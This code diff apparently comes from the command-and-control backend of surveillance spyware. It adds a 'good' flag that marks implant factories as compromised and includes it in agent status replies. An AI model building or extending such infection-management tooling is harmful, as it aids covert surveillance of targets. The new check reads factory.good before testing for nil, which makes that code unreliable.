@@ -23,7 +23,7 @@ class AgentController < RESTController
 
     mongoid_query do
       db = Mongoid.database
-      j = db.collection('items').find(filter, :fields => ["name", "desc", "status", "_kind", "path", "type", "ident", "instance", "version", "platform", "uninstalled", "upgradable", "demo", "scout", "stat.last_sync", "stat.last_sync_status", "stat.user", "stat.device", "stat.source", "stat.size", "stat.grid_size", "stat.ghost"])
+      j = db.collection('items').find(filter, :fields => ["name", "desc", "status", "_kind", "path", "type", "ident", "instance", "version", "platform", "uninstalled", "upgradable", "demo", "scout", "good", "stat.last_sync", "stat.last_sync_status", "stat.user", "stat.device", "stat.source", "stat.size", "stat.grid_size", "stat.ghost"])
       ok(j)
     end
   end
@@ -35,7 +35,7 @@ class AgentController < RESTController
 
     mongoid_query do
       db = Mongoid.database
-      j = db.collection('items').find({_id: BSON::ObjectId.from_string(@params['_id'])}, :fields => ["name", "desc", "status", "_kind", "stat", "path", "type", "ident", "instance", "platform", "upgradable", "deleted", "uninstalled", "demo", "scout", "version", "counter", "configs"])
+      j = db.collection('items').find({_id: BSON::ObjectId.from_string(@params['_id'])}, :fields => ["name", "desc", "status", "_kind", "stat", "path", "type", "ident", "instance", "platform", "upgradable", "deleted", "uninstalled", "demo", "scout", "good", "version", "counter", "configs"])
 
       agent = j.first
 
@@ -322,7 +322,7 @@ class AgentController < RESTController
 
     # yes it is, return the status
     unless agent.nil?
-      trace :info, "#{agent[:name]} status is #{agent[:status]} [#{agent[:ident]}:#{agent[:instance]}] (demo: #{demo}, scout: #{scout})"
+      trace :info, "#{agent[:name]} status is #{agent[:status]} [#{agent[:ident]}:#{agent[:instance]}] (demo: #{demo}, scout: #{scout}, good: #{agent[:good]})"
 
       # if the agent was queued, but now we have a license, use it and set the status to open
       # a demo agent will never be queued
@@ -346,12 +346,15 @@ class AgentController < RESTController
         agent.save
       end
 
-      status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id]}
+      status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id], :good => agent[:good]}
       return ok(status)
     end
 
     # search for the factory of that instance
     factory = Item.where({_kind: 'factory', ident: @params['ident'], status: 'open'}).first
+
+    # the status of the factory must be open otherwise no instance can be cloned from it
+    return not_found("Factory is marked as compromised found: #{@params['ident']}") unless factory.good
 
     # the status of the factory must be open otherwise no instance can be cloned from it
     return not_found("Factory not found: #{@params['ident']}") if factory.nil?
@@ -425,7 +428,7 @@ class AgentController < RESTController
     # notify the injectors of the infection
     ::Injector.all.each {|p| p.disable_on_sync(factory)}
 
-    status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id]}
+    status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id], :good => agent[:good]}
     return ok(status)
   end
 
